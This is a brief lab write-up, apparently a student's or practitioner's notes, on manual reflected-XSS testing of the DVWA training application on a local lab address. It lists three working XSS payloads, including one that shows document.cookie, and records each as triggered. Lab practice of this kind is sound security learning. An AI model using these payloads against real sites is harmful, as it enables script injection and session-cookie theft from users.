# Manual XSS Testing – DVWA

## 🎯 Target
- DVWA Reflected XSS module  
- URL: `http://192.168.56.101/dvwa/vulnerabilities/xss_r/`

## 🔍 Steps
1. Set DVWA to Low Security via `security.php`
2. Access XSS (Reflected) module
3. Test payloads:
   - `<script>alert(1)</script>` ✅ Triggered
   - `<img src=x onerror=alert('XSS')>` ✅ Triggered  
   - `<script>alert(document.cookie)</script>` ✅ Triggered
4. Observed alert popups as confirmation (Firefox browser)

## ✅ Result
- XSS vulnerability confirmed  
- Reflected input successfully executed

## 🖼 Screenshot
![XSS Popup](screenshots/xss_popup.png)
